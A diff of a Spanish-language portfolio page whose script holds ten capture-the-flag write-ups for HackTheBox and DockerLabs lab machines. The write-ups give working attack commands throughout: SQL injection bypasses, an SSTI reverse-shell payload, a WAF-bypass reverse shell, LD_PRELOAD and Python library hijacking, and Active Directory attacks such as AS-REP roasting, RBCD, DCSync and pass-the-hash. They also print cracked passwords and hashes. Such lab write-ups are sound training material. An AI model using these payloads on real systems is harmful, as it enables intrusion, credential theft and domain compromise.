+      <a href="https://tryhackme.com/p/josematr" class="soclink" target="_blank"><svg viewBox="0 0 24 24"><path d="M10.705 0C7.54 0 4.902 2.285 4.34 5.291a4.542 4.542 0 00-.705-.055C1.628 5.236 0 6.864 0 8.87s1.628 3.636 3.636 3.636h7.069C12.729 12.505 14 11.234 14 9.2V4.8C14 2.15 12.629 0 10.705 0zm7.59 5.236a4.544 4.544 0 00-.705.055C17.128 2.285 14.49 0 11.295 0H11.3c1.914.006 3.273 2.152 3.273 4.8v4.4c0 2.034 1.271 3.305 3.295 3.305h2.496C22.372 12.505 24 10.877 24 8.87s-1.628-3.634-3.636-3.634H18.295z"/></svg>TryHackMe</a>
+    </div>
+    <a href="mailto:tu@email.com" class="emailbtn">Enviar email</a>
+  </div>
+</div></div>
+<footer><p>© 2025 <span>José Manuel Talavera Ruiz</span> — github.com/josematr — Hecho con ☠️ y muchas horas de HTB</p></footer>
 <script>
-// Cursor
-const cursor = document.getElementById('cursor');
-const ring = document.getElementById('cursorRing');
-document.addEventListener('mousemove', e => {
-  cursor.style.left = e.clientX + 'px';
-  cursor.style.top = e.clientY + 'px';
-  setTimeout(() => {
-    ring.style.left = e.clientX + 'px';
-    ring.style.top = e.clientY + 'px';
-  }, 80);
+const WU=[{id:1,title:"GoodGames",platform:"HackTheBox",difficulty:"easy",date:"2024",tags:["Linux", "SQLi", "SSTI", "Jinja2", "Docker Escape"],excerpt:"SQLi en login, hash MD5 crackeado, SSTI en panel Flask interno via Jinja2 y escape de contenedor Docker mediante directorio compartido con el host.",content:"<div class='ws'><div class='wchain'><span class='wstep'>SQLi</span><span class='warr'>&#8594;</span><span class='wstep'>Hash Crack</span><span class='warr'>&#8594;</span><span class='wstep'>SSTI Jinja2</span><span class='warr'>&#8594;</span><span class='wstep'>Docker Escape</span><span class='warr'>&#8594;</span><span class='wstep end'>ROOT</span></div></div><div class='ws'><h3 class='wh'>// Reconocimiento</h3><p><b>IP:</b> 10.129.27.92 &bull; <b>OS:</b> Linux Debian &bull; Puerto: 80/tcp Werkzeug 2.0.2</p><pre class='wcode'><span class='cc'>$ nmap -sC -sV -Pn 10.129.27.92</span>\n<span class='co'>80/tcp open http Werkzeug httpd 2.0.2 (Python 3.9.2)</span>\n<span class='cc'>$ gobuster dir -u http://10.129.27.92 -w directory-list-2.3-medium.txt</span>\n<span class='co'>/login (200) /signup (200) /profile (200) /blog (200)</span></pre></div><div class='ws'><h3 class='wh'>// SQL Injection</h3><p>El campo email del login es vulnerable a SQLi time-based blind.</p><pre class='wcode'><span class='cc'># Bypass login: comenta la comprobacion de contrasena</span>\n<span class='ch'>email=admin@goodgames.htb'-- -&amp;password=test</span>\n<span class='co'>&rarr; Login Successful &#10003;</span>\n<span class='cc'>$ sqlmap -r req.txt --batch -D main -T user --dump</span>\n<span class='cf'>| admin | 2b22337f218b2d82dfc3b6f77e7cb8ec |</span></pre><div class='ib'>&#x1F4A1; Hash MD5 &rarr; CrackStation &rarr; <b>superadministrator</b></div></div><div class='ws'><h3 class='wh'>// SSTI Jinja2 &mdash; RCE como root</h3><pre class='wcode'><span class='cc'># internal-administration.goodgames.htb &rarr; Flask-Volt</span>\n<span class='ch'>{{7*7}}</span>  &rarr;  49 &#10003;\n<span class='ch'>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</span>\n<span class='co'>uid=0(root) gid=0(root)</span>\n<span class='cc'># Reverse shell via SSTI</span>\n<span class='ch'>{{config.__class__.__init__.__globals__['os'].popen('bash -c \"bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1\"').read()}}</span></pre></div><div class='ws'><h3 class='wh'>// Docker Escape &mdash; SUID Bash</h3><p>/home/augustus montado desde el host. Reutilizamos credenciales para SSH y colocamos bash SUID desde el contenedor (root).</p><pre class='wcode'><span class='ch'>ssh augustus@172.19.0.1  # superadministrator</span>\n<span class='cc'># Desde contenedor (root):</span>\n<span class='ch'>cp /bin/bash /home/augustus/bash\nchown root:root /home/augustus/bash\nchmod 4755 /home/augustus/bash</span>\n<span class='cc'># Desde SSH host:</span>\n<span class='ch'>./bash -p  &rarr;  whoami &rarr;  root</span></pre><div class='fb'><span>&#x1F6A9;</span><div><b>PWNED &mdash; GOODGAMES</b><div>User &#10003; Root &#10003; &bull; Docker Escape via shared dir + SUID bash</div></div></div></div>"},{id:2,title:"Injection",platform:"DockerLabs",difficulty:"easy",date:"2024",tags:["Linux", "SQLi", "SQLMap", "SUID", "GTFOBins"],excerpt:"Inyeccion SQL con SQLMap para extraer credenciales MySQL. Acceso SSH y escalada de privilegios abusando del binario env con bit SUID via GTFOBins.",content:"<div class='ws'><div class='wchain'><span class='wstep'>SQLi</span><span class='warr'>&#8594;</span><span class='wstep'>SSH</span><span class='warr'>&#8594;</span><span class='wstep'>SUID env</span><span class='warr'>&#8594;</span><span class='wstep end'>ROOT</span></div></div><div class='ws'><h3 class='wh'>// Reconocimiento</h3><pre class='wcode'><span class='cc'>$ nmap -sC -sV -Pn 172.17.0.2</span>\n<span class='co'>22/tcp open ssh   OpenSSH 8.9p1 Ubuntu\n80/tcp open http  Apache httpd 2.4.52</span></pre></div><div class='ws'><h3 class='wh'>// SQL Injection con SQLMap</h3><pre class='wcode'><span class='cc'>$ sqlmap -r req.txt --batch -D register -T users --dump</span>\n<span class='ch'>| passwd             | username |\n| KJSDFG789FGSDF78   | dylan    |</span></pre></div><div class='ws'><h3 class='wh'>// Acceso + Escalada SUID</h3><pre class='wcode'><span class='cc'>$ ssh dylan@172.17.0.2  # Password: KJSDFG789FGSDF78</span>\n<span class='ch'>dylan@147d44646bbf:~$ &#10003;</span>\n<span class='ch'>$ find / -perm -4000 2&gt;/dev/null</span>\n<span class='co'>/usr/bin/env  &larr; INTERESANTE</span>\n<span class='ch'>$ env /bin/sh -p</span>\n<span class='co'># whoami &rarr; root</span></pre><div class='ib'>&#x1F4A1; GTFOBins: env con SUID puede lanzar shell con privilegios del propietario (root).</div><div class='fb'><span>&#x1F6A9;</span><div><b>PWNED &mdash; INJECTION</b><div>Root via SUID env + GTFOBins</div></div></div></div>"},{id:3,title:"OpenSource",platform:"HackTheBox",difficulty:"easy",date:"2024",tags:["Linux", "Path Traversal", "Werkzeug PIN", "Docker Escape", "Git Hooks"],excerpt:"Path traversal bypasseando filtro recursivo, calculo del PIN de Werkzeug debug via LFI, escape a host con clave RSA en Gitea y git hook pre-commit ejecutado por cron.",content:"<div class='ws'><div class='wchain'><span class='wstep'>Path Traversal</span><span class='warr'>&#8594;</span><span class='wstep'>Werkzeug PIN</span><span class='warr'>&#8594;</span><span class='wstep'>Docker RCE</span><span class='warr'>&#8594;</span><span class='wstep'>Gitea RSA</span><span class='warr'>&#8594;</span><span class='wstep'>Git Hook</span><span class='warr'>&#8594;</span><span class='wstep end'>ROOT</span></div></div><div class='ws'><h3 class='wh'>// Credenciales en Git</h3><pre class='wcode'><span class='cc'>$ git log --all --oneline &amp;&amp; git show a76f8f7</span>\n<span class='cf'># .vscode/settings.json:\n\"http.proxy\": \"http://dev01:Soulless_Developer#2022@...\"</span>\n<span class='cc'># Bypass filtro utils.py (elimina \"../\" recursivamente)</span>\n<span class='ch'>....//....//....//etc/passwd  &rarr;  ../../../etc/passwd</span></pre></div><div class='ws'><h3 class='wh'>// Werkzeug Debug PIN</h3><pre class='wcode'><span class='cc'># Datos leidos via LFI del sistema</span>\n<span class='ch'>MAC eth0: 02:42:ac:11:00:05  &rarr;  2485377892357\nboot_id + docker_cgroup = machine_id</span>\n<span class='co'># probably_public_bits: root, flask.app, Flask, /usr/local/lib/python3.10/.../app.py</span>\n<span class='cf'>&rarr; PIN calculado: 219-240-731</span></pre><p>Acceso a <code>/console</code> Werkzeug &rarr; reverse shell como root en el contenedor Docker.</p></div><div class='ws'><h3 class='wh'>// Escape Docker + Git Hook PrivEsc</h3><pre class='wcode'><span class='cc'># Chisel para acceder a Gitea interno (port 3000)</span>\n<span class='ch'>./chisel server --reverse -p 1234          # Kali\n./chisel client IP:1234 R:3000:172.17.0.1:3000  # Contenedor</span>\n<span class='cc'># Clave RSA privada en Gitea repo home-backup</span>\n<span class='ch'>$ ssh -i id_rsa dev01@10.129.227.140</span>\n<span class='co'>dev01@opensource:~$ &rarr; User flag: 01f4e766...</span>\n<span class='cc'># pspy64: cron ejecuta git commit como root cada minuto</span>\n<span class='ch'>$ cat &gt; ~/.git/hooks/pre-commit &lt;&lt; EOF\n#!/bin/bash\nchmod +s /bin/bash\nEOF\nchmod +x ~/.git/hooks/pre-commit</span>\n<span class='ch'>$ /bin/bash -p  &rarr;  root</span></pre><div class='fb'><span>&#x1F6A9;</span><div><b>PWNED &mdash; OPENSOURCE</b><div>Root via git pre-commit hook ejecutado por cron como root</div></div></div></div>"},{id:4,title:"Sauna",platform:"HackTheBox",difficulty:"easy",date:"2024",tags:["Windows", "Active Directory", "AS-REP Roasting", "DCSync", "Kerberos"],excerpt:"AS-REP Roasting en fsmith, credenciales en texto claro en registro Winlogon (AutoLogon) y DCSync completo sobre EGOTISTICAL-BANK.LOCAL.",content:"<div class='ws'><div class='wchain'><span class='wstep'>AS-REP Roast</span><span class='warr'>&#8594;</span><span class='wstep'>fsmith</span><span class='warr'>&#8594;</span><span class='wstep'>Winlogon Creds</span><span class='warr'>&#8594;</span><span class='wstep'>svc_loanmgr</span><span class='warr'>&#8594;</span><span class='wstep'>DCSync</span><span class='warr'>&#8594;</span><span class='wstep end'>DA</span></div></div><div class='ws'><h3 class='wh'>// Entorno</h3><p><b>Dominio:</b> EGOTISTICAL-BANK.LOCAL &bull; Windows Server 2019 &bull; IP: 10.129.95.180<br>53 DNS &bull; 88 Kerberos &bull; 389 LDAP &bull; 445 SMB &bull; 5985 WinRM</p></div><div class='ws'><h3 class='wh'>// AS-REP Roasting</h3><pre class='wcode'><span class='cc'>$ impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile usuarios.txt -no-pass</span>\n<span class='ch'>$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:4a5ab3f...</span>\n<span class='cc'>$ hashcat -m 18200 hash.txt rockyou.txt</span>\n<span class='cf'>&rarr; Thestrokes23</span>\n<span class='cc'>$ evil-winrm -i 10.129.30.188 -u fsmith -p 'Thestrokes23'</span>\n<span class='co'>&rarr; User flag obtenida</span></pre></div><div class='ws'><h3 class='wh'>// Credenciales en Registro Winlogon</h3><pre class='wcode'><span class='cc'>reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"</span>\n<span class='ch'>DefaultUserName: EGOTISTICALBANK\\svc_loanmanager\nDefaultPassword: Moneymakestheworldgoround!</span></pre><div class='wb'>&#x26A0;&#xFE0F; Contrasenas en texto claro en Winlogon AutoLogon son criticas en entornos AD.</div></div><div class='ws'><h3 class='wh'>// DCSync &mdash; Compromiso Total</h3><p>BloodHound: SVC_LOANMGR tiene GetChanges + GetChangesAll &rarr; DCSync sin tocar el DC.</p><pre class='wcode'><span class='cc'>$ impacket-secretsdump EGOTISTICALBANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.30.188</span>\n<span class='ch'>Administrator:500:aad3b435:823452073d75b9d1cf70ebdf86c7f98e:::</span>\n<span class='cc'>$ evil-winrm -i 10.129.30.188 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e</span>\n<span class='co'>&rarr; Root flag obtenida</span></pre><div class='fb'><span>&#x1F6A9;</span><div><b>DOMAIN COMPROMISED &mdash; SAUNA</b><div>EGOTISTICAL-BANK.LOCAL &bull; Total Domain Compromise via DCSync</div></div></div></div>"},{id:5,title:"SecOrNotSec",platform:"DockerLabs",difficulty:"medium",date:"2024",tags:["Linux", "AES-CBC", "Cookie Forgery", "WAF Bypass", "LD_PRELOAD"],excerpt:"Fuga de clave AES en env.bak, forja de cookies con IV estatico, bypass de WAF via string concatenation y escalada a root con LD_PRELOAD hijacking.",content:"<div class='ws'><div class='wchain'><span class='wstep'>env.bak</span><span class='warr'>&#8594;</span><span class='wstep'>AES Forge</span><span class='warr'>&#8594;</span><span class='wstep'>WAF Bypass</span><span class='warr'>&#8594;</span><span class='wstep'>sudo find</span><span class='warr'>&#8594;</span><span class='wstep'>LD_PRELOAD</span><span class='warr'>&#8594;</span><span class='wstep end'>ROOT</span></div></div><div class='ws'><h3 class='wh'>// Fuga de Clave AES</h3><pre class='wcode'><span class='cc'>$ gobuster dir -u http://172.17.0.2:5000 -x bak,old,backup</span>\n<span class='ch'>/env.bak (200)  &larr; CRITICO</span>\n<span class='cf'>CLAVE_SECRETA = 'H4ckTh3Pl4n3t_26'</span></pre><div class='ib'>&#x1F4A1; Comentario HTML revela IV estatico: <b>0123456789abcdef</b>. Con clave e IV conocidos podemos descifrar y forjar cualquier cookie AES-CBC.</div></div><div class='ws'><h3 class='wh'>// Cookie Forgery</h3><pre class='wcode'><span class='ch'>key = b'H4ckTh3Pl4n3t_26'  &bull;  iv = b'0123456789abcdef'</span>\n<span class='co'>&rarr; cookie descifrada: {\"user\": \"guest\", \"is_admin\": false}</span>\n<span class='ch'>payload = b'{\"user\": \"admin\", \"is_admin\": true}'</span>\n<span class='co'>&rarr; cookie forjada &rarr; acceso admin panel &#10003;</span></pre></div><div class='ws'><h3 class='wh'>// WAF Bypass &mdash; RCE</h3><p>WAF bloquea: bash, nc, python, |, &amp;&amp;. Bypass con comillas vacias: <code>b''ash</code> = bash para la shell pero el WAF no lo detecta.</p><pre class='wcode'><span class='ch'>address=172.17.0.1\n&amp;echo \"b''ash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1\" &gt; rv.sh\naddress=172.17.0.1\n&amp;chmod +x rv.sh\naddress=172.17.0.1\n&amp;b''ash rv.sh</span>\n<span class='co'>firstatack@b1c7a5748e44:/app$ &#10003;</span></pre></div><div class='ws'><h3 class='wh'>// LD_PRELOAD Hijacking &rarr; Root</h3><pre class='wcode'><span class='ch'>$ sudo -u chocolate find . -exec /bin/sh \\; -quit</span>\n<span class='co'># chocolate: (root) SETENV: /usr/local/bin/syscheck</span>\n<span class='cc'># evil.c: void _init() { setuid(0); system(\"/bin/sh\"); }</span>\n<span class='ch'>$ gcc -shared -fPIC -nostartfiles -o /tmp/evil.so /tmp/evil.c\n$ sudo LD_PRELOAD=/tmp/evil.so /usr/local/bin/syscheck</span>\n<span class='co'># whoami &rarr; root</span></pre><div class='fb'><span>&#x1F6A9;</span><div><b>PWNED &mdash; SECORNOTSEC</b><div>Root via LD_PRELOAD hijacking con SETENV</div></div></div></div>"},{id:6,title:"Support",platform:"HackTheBox",difficulty:"easy",date:"2024",tags:["Windows", "Active Directory", "SMB", "Reverse Engineering .NET", "RBCD"],excerpt:"Binario .NET con contrasena XOR en SMB share, contrasena en atributo LDAP info y Total Domain Compromise via RBCD (Resource-Based Constrained Delegation).",content:"<div class='ws'><div class='wchain'><span class='wstep'>SMB Enum</span><span class='warr'>&#8594;</span><span class='wstep'>.NET Decompile</span><span class='warr'>&#8594;</span><span class='wstep'>XOR Decode</span><span class='warr'>&#8594;</span><span class='wstep'>LDAP info</span><span class='warr'>&#8594;</span><span class='wstep'>BloodHound</span><span class='warr'>&#8594;</span><span class='wstep'>RBCD</span><span class='warr'>&#8594;</span><span class='wstep end'>SYSTEM</span></div></div><div class='ws'><h3 class='wh'>// SMB + Ingenieria Inversa .NET</h3><pre class='wcode'><span class='cc'>$ smbclient -L 10.129.230.181 -N</span>\n<span class='ch'>support-tools  &larr; share no estandar</span>\n<span class='ch'>smb: \\&gt; get UserInfo.exe.zip</span>\n<span class='cc'># Decompilar: ilspycmd UserInfo.exe -p -o ./decompilado/</span>\n<span class='co'># Protected.cs: enc_password con doble XOR key:\"armando\" XOR 0xDF</span>\n<span class='ch'>&rarr; support\\ldap : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</span></pre></div><div class='ws'><h3 class='wh'>// Contrasena en Atributo LDAP</h3><pre class='wcode'><span class='cc'>$ ldapsearch -x -H ldap://10.129.230.181 -D \"support\\ldap\" -w 'nvEfEK16...' -b \"DC=support,DC=htb\" \"(objectClass=user)\"</span>\n<span class='cf'># Atributo personalizado 'info' del usuario support:\ninfo: Ironside47pleasure40Watchful</span>\n<span class='cc'>$ evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'</span>\n<span class='co'>&rarr; User flag obtenida</span></pre></div><div class='ws'><h3 class='wh'>// Ataque RBCD</h3><p>BloodHound: Shared Support Accounts &rarr; GenericAll sobre DC &rarr; RBCD posible.</p><pre class='wcode'><span class='ch'>$ impacket-addcomputer support.htb/support:'Ironside47...' -computer-name 'FAKE$' -computer-pass 'Fake1234!'\n$ impacket-rbcd support.htb/support:'Ironside47...' -delegate-from 'FAKE$' -delegate-to 'DC$' -action write\n$ impacket-getST support.htb/'FAKE$':'Fake1234!' -spn 'cifs/dc.support.htb' -impersonate Administrator\n$ impacket-psexec -k -no-pass dc.support.htb</span>\n<span class='co'>NT AUTHORITY\\SYSTEM &#10003;</span></pre><div class='fb'><span>&#x1F6A9;</span><div><b>DOMAIN COMPROMISED &mdash; SUPPORT</b><div>support.htb &bull; RBCD Attack &bull; NT AUTHORITY\\SYSTEM</div></div></div></div>"},{id:7,title:"Admirer",platform:"HackTheBox",difficulty:"easy",date:"2024",tags:["Linux", "FTP", "Adminer 4.6.2", "LOAD DATA INFILE", "Python Library Hijacking"],excerpt:"Credenciales FTP en robots.txt, file disclosure en Adminer 4.6.2 leyendo index.php de produccion y escalada con Python Library Hijacking via SETENV+PYTHONPATH.",content:"<div class='ws'><div class='wchain'><span class='wstep'>robots.txt</span><span class='warr'>&#8594;</span><span class='wstep'>FTP Creds</span><span class='warr'>&#8594;</span><span class='wstep'>Adminer Disclosure</span><span class='warr'>&#8594;</span><span class='wstep'>SSH</span><span class='warr'>&#8594;</span><span class='wstep'>PYTHONPATH</span><span class='warr'>&#8594;</span><span class='wstep end'>ROOT</span></div></div><div class='ws'><h3 class='wh'>// Reconocimiento</h3><pre class='wcode'><span class='co'>21/tcp FTP vsftpd 3.0.3 &bull; 22/tcp SSH &bull; 80/tcp Apache 2.4.25</span>\n<span class='cc'># robots.txt &rarr; /admin-dir &rarr; credentials.txt</span>\n<span class='cf'>FTP: ftpuser:%n?4Wz}R$tTF7</span></pre></div><div class='ws'><h3 class='wh'>// Adminer 4.6.2 &mdash; File Disclosure</h3><pre class='wcode'><span class='cc'># FTP &rarr; html.tar.gz &rarr; contiene codigo fuente con credenciales backup</span>\n<span class='co'># /utility-scripts/adminer.php (v4.6.2) &rarr; conectar a BD de Kali</span>\n<span class='ch'>LOAD DATA LOCAL INFILE '/var/www/html/index.php'\nINTO TABLE pwned.panx;\nSELECT datos FROM pwned.panx;</span>\n<span class='cf'>&rarr; Contrasena produccion: &lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;</span></pre><div class='wb'>&#x26A0;&#xFE0F; Contrasena del backup FTP es DIFERENTE a la de produccion. Usar la leida desde index.php real.</div></div><div class='ws'><h3 class='wh'>// Python Library Hijacking</h3><pre class='wcode'><span class='cc'>$ ssh waldo@10.129.X.X  # &lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;</span>\n<span class='co'>&rarr; User flag obtenida</span>\n<span class='ch'>(ALL) SETENV: /opt/scripts/admin_tasks.sh</span>\n<span class='cc'># shutil.py malicioso en /tmp/privesc/</span>\n<span class='ch'>def make_archive(a, b, c):\n    os.system('chmod +s /bin/bash')\n$ sudo PYTHONPATH=/tmp/privesc /opt/scripts/admin_tasks.sh  # opcion 6\n$ bash -p  &rarr;  root</span></pre><div class='fb'><span>&#x1F6A9;</span><div><b>PWNED &mdash; ADMIRER</b><div>Root via Python Library Hijacking + SETENV + PYTHONPATH</div></div></div></div>"},{id:8,title:"Buff",platform:"HackTheBox",difficulty:"easy",date:"2024",tags:["Windows", "RCE sin auth", "Buffer Overflow", "Chisel", "CloudMe"],excerpt:"RCE sin autenticacion en Gym Management 1.0 (EDB-48506). Port-forwarding con Chisel y Buffer Overflow en CloudMe 1.11.2 para escalar a Administrador.",content:"<div class='ws'><div class='wchain'><span class='wstep'>Gym CMS ID</span><span class='warr'>&#8594;</span><span class='wstep'>EDB-48506 RCE</span><span class='warr'>&#8594;</span><span class='wstep'>Webshell</span><span class='warr'>&#8594;</span><span class='wstep'>Chisel Tunnel</span><span class='warr'>&#8594;</span><span class='wstep'>CloudMe BOF</span><span class='warr'>&#8594;</span><span class='wstep end'>ADMIN</span></div></div><div class='ws'><h3 class='wh'>// Reconocimiento</h3><pre class='wcode'><span class='cc'>$ nmap -sC -sV -Pn 10.129.23.243</span>\n<span class='co'>8080/tcp open http Apache 2.4.43 (Win64) PHP/7.4.6</span>\n<span class='ch'># Pie de pagina: \"Made using Gym Management Software 1.0\"</span></pre><div class='ib'>&#x1F4A1; Identificar el CMS y version exacta fue la clave. Footer, headers HTTP y codigo fuente siempre.</div></div><div class='ws'><h3 class='wh'>// RCE sin Autenticacion &mdash; EDB-48506</h3><pre class='wcode'><span class='cc'>$ searchsploit gym management</span>\n<span class='ch'>Gym Management System 1.0 - Unauthenticated RCE &rarr; EDB-ID: 48506</span>\n<span class='cc'>$ python2 48506.py 'http://10.129.23.243:8080/'</span>\n<span class='co'>[+] Successfully connected to webshell.\nbuff\\shaun&gt; whoami</span>\n<span class='cc'># Reverse shell con nc.exe via SMB temporal</span>\n<span class='ch'>$ impacket-smbserver smbfolder $(pwd) -smb2support</span></pre></div><div class='ws'><h3 class='wh'>// Buffer Overflow CloudMe &mdash; Chisel</h3><pre class='wcode'><span class='co'># CloudMe 1.11.2 escucha en localhost:8888 &rarr; no expuesto</span>\n<span class='cc'># Port-forwarding con Chisel</span>\n<span class='ch'>./chisel server -p 9001 --reverse                              # Kali\nchisel.exe client 10.10.15.219:9001 R:8888:127.0.0.1:8888     # Windows</span>\n<span class='cc'># Shellcode con msfvenom + exploit BOF</span>\n<span class='ch'>$ msfvenom -p windows/exec CMD=\"net localgroup administrators shaun /add\" -b '\\x00\\x0A\\x0D' -f python\n$ python3 48389.py</span>\n<span class='co'>&rarr; buff\\administrator &#10003;</span></pre><div class='fb'><span>&#x1F6A9;</span><div><b>PWNED &mdash; BUFF</b><div>Administrator via CloudMe BOF + Chisel port-forwarding</div></div></div></div>"},{id:9,title:"Forest",platform:"HackTheBox",difficulty:"easy",date:"2024",tags:["Windows", "Active Directory", "AS-REP Roasting", "WriteDacl", "DCSync", "Pass-the-Hash"],excerpt:"Null session en RPC, AS-REP Roasting en svc-alfresco y cadena Account Operators a WriteDacl sobre el dominio para DCSync + Pass-the-Hash.",content:"<div class='ws'><div class='wchain'><span class='wstep'>Null Session</span><span class='warr'>&#8594;</span><span class='wstep'>AS-REP Roast</span><span class='warr'>&#8594;</span><span class='wstep'>svc-alfresco</span><span class='warr'>&#8594;</span><span class='wstep'>Account Ops</span><span class='warr'>&#8594;</span><span class='wstep'>WriteDacl</span><span class='warr'>&#8594;</span><span class='wstep'>DCSync</span><span class='warr'>&#8594;</span><span class='wstep end'>DA</span></div></div><div class='ws'><h3 class='wh'>// Entorno</h3><p><b>Dominio:</b> htb.local &bull; Windows Server 2016 &bull; Null session habilitada<br>AS-REP Roasting &bull; DCSync &bull; Pass-the-Hash</p></div><div class='ws'><h3 class='wh'>// Null Session + AS-REP Roasting</h3><pre class='wcode'><span class='cc'>$ rpcclient -U \"\" -N 10.129.24.165</span>\n<span class='ch'>enumdomusers &rarr; svc-alfresco (acb: 0x00010210 = UF_DONT_REQUIRE_PREAUTH)</span>\n<span class='cc'>$ impacket-GetNPUsers htb.local/svc-alfresco -no-pass</span>\n<span class='ch'>$krb5asrep$23$svc-alfresco@HTB.LOCAL:...</span>\n<span class='cc'>$ hashcat -m 18200 hash.txt rockyou.txt</span>\n<span class='cf'>&rarr; s3rvice</span>\n<span class='cc'>$ evil-winrm -i 10.129.24.165 -u svc-alfresco -p s3rvice</span>\n<span class='co'>&rarr; User flag: b2302e1963f7971d6b656c9b4edd887c</span></pre></div><div class='ws'><h3 class='wh'>// Cadena Account Operators &rarr; Domain Admin</h3><p>svc-alfresco &rarr; Account Operators &rarr; Exchange Windows Permissions (WriteDacl) &rarr; DCSync &rarr; Pass-the-Hash.</p><pre class='wcode'><span class='ch'>$ net user hacker Password123! /add /domain\n$ net group \"Exchange Windows Permissions\" hacker /add</span>\n<span class='cc'># PowerView: conceder DCSync al usuario hacker</span>\n<span class='ch'>Add-DomainObjectAcl -Credential $cred -TargetIdentity \"DC=htb,DC=local\" -PrincipalIdentity hacker -Rights DCSync</span>\n<span class='cc'>$ impacket-secretsdump 'htb.local/hacker:Password123!@10.129.24.165'</span>\n<span class='ch'>Administrator:500:aad3b435:32693b11e6aa90eb43d32c72a07ceea6:::</span>\n<span class='cc'>$ evil-winrm -i 10.129.24.165 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6</span>\n<span class='co'>&rarr; Root flag: d04d90ed9bc5c30fb3563a2c5823be47</span></pre><div class='fb'><span>&#x1F6A9;</span><div><b>DOMAIN COMPROMISED &mdash; FOREST</b><div>htb.local &bull; WriteDacl &rarr; DCSync &rarr; Pass-the-Hash</div></div></div></div>"},{id:10,title:"Administrator",platform:"HackTheBox",difficulty:"medium",date:"2025",tags:["Windows", "Active Directory", "BloodHound", "Kerberoasting", "DCSync", "GenericAll", "psafe3"],excerpt:"Cadena de 6 usuarios via BloodHound: GenericAll, ForceChangePassword, FTP+psafe3 cracking, GenericWrite+Kerberoasting y DCSync para comprometer administrator.htb.",content:"<div class='ws'><div class='wchain'><span class='wstep'>olivia</span><span class='warr'>&#8594;</span><span class='wstep'>michael</span><span class='warr'>&#8594;</span><span class='wstep'>benjamin</span><span class='warr'>&#8594;</span><span class='wstep'>.psafe3</span><span class='warr'>&#8594;</span><span class='wstep'>emily</span><span class='warr'>&#8594;</span><span class='wstep'>ethan</span><span class='warr'>&#8594;</span><span class='wstep end'>DA</span></div></div><div class='ws'><h3 class='wh'>// Entorno</h3><p><b>Dominio:</b> administrator.htb &bull; <b>Dificultad:</b> Medium &bull; Windows AD<br>Puertos: 21 FTP &bull; 88 Kerberos &bull; 389 LDAP &bull; 445 SMB &bull; 5985 WinRM</p></div><div class='ws'><h3 class='wh'>// BloodHound &mdash; Mapa Completo de Ataque</h3><pre class='wcode'><span class='cc'>$ evil-winrm -i 10.129.31.146 -u olivia -p 'ichliebedich'  # Creds HTB</span>\n<span class='cc'>$ bloodhound-python -d administrator.htb -u olivia -p 'ichliebedich' -c all</span>\n<span class='co'>Found 11 users, 53 groups, 19 containers</span>\n<span class='ch'>OLIVIA &rarr; GenericAll &rarr; MICHAEL\nMICHAEL &rarr; ForceChangePassword &rarr; BENJAMIN\nEMILY &rarr; GenericWrite &rarr; ETHAN\nETHAN &rarr; GetChanges/GetChangesAll &rarr; DOMAIN (DCSync!)</span></pre></div><div class='ws'><h3 class='wh'>// Cadena de Escalada Paso a Paso</h3><pre class='wcode'><span class='cc'># Paso 1: olivia &rarr; michael (GenericAll = control total)</span>\n<span class='ch'>bloodyAD -d administrator.htb -u olivia -p 'ichliebedich' --host 10.129.31.146 set password michael 'Password123!'</span>\n\n<span class='cc'># Paso 2: michael &rarr; benjamin (ForceChangePassword)</span>\n<span class='ch'>bloodyAD -d administrator.htb -u michael -p 'Password123!' --host 10.129.31.146 set password benjamin 'Password123!'</span>\n\n<span class='cc'># Paso 3: benjamin &rarr; FTP &rarr; Backup.psafe3</span>\n<span class='ch'>ftp&gt; get Backup.psafe3\nhashcat -m 5200 Backup.psafe3 rockyou.txt --force</span>\n<span class='cf'>&rarr; Master password: tekieromucho</span>\n<span class='co'>&rarr; BD contiene creds de: alexander, emily, emma</span>\n\n<span class='cc'># Paso 4: emily &rarr; ethan (GenericWrite &rarr; SPN falso &rarr; Kerberoast)</span>\n<span class='ch'>bloodyAD [...] set object ethan servicePrincipalName -v 'fake/dc.administrator.htb'\nimpacket-GetUserSPNs administrator.htb/emily:[...] -request -outputfile hash_ethan.txt\nhashcat -m 13100 hash_ethan.txt rockyou.txt --force</span>\n<span class='cf'>&rarr; ethan : limpbizkit</span>\n\n<span class='cc'># Paso 5: ethan &rarr; DCSync &rarr; hash Administrator</span>\n<span class='ch'>impacket-secretsdump administrator.htb/ethan:'limpbizkit'@10.129.31.146</span>\n<span class='co'>Administrator:500:aad3b435:3dc553ce4b9fd20bd016e098d2d2fd2e:::</span>\n<span class='ch'>evil-winrm -i 10.129.31.146 -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e</span>\n<span class='co'>&rarr; Root flag: 35a28fc30fc5c445b0c7236aa9365fbf</span></pre><div class='ib'>&#x1F4A1; Error KRB_AP_ERR_SKEW: Kerberos tolera max 5 min de diferencia. Solucin: <code>timedatectl set-ntp false</code> y sincronizar hora manualmente con el DC.</div><div class='fb'><span>&#x1F6A9;</span><div><b>DOMAIN COMPROMISED &mdash; ADMINISTRATOR</b><div>administrator.htb &bull; Cadena 6 usuarios &bull; GenericAll+ForceChangePwd+psafe3+Kerberoast+DCSync</div></div></div></div>"}];function dCls(d){return{easy:'de',medium:'dm',hard:'dh',insane:'dh'}[d]||'de';}
+var grid=document.getElementById('wugrid');
+var filtered=WU.slice(),curIdx=0;
+function renderCards(data){
+  grid.innerHTML='';
+  var styleEl=document.getElementById('cin-s');
+  if(!styleEl){styleEl=document.createElement('style');styleEl.id='cin-s';styleEl.textContent='@keyframes cin{from{opacity:0;transform:translateY(18px);}to{opacity:1;transform:translateY(0);}}';document.head.appendChild(styleEl);}
+  data.forEach(function(wu,i){
+    var card=document.createElement('div');
+    card.className='wucard';
+    card.style.opacity='0';
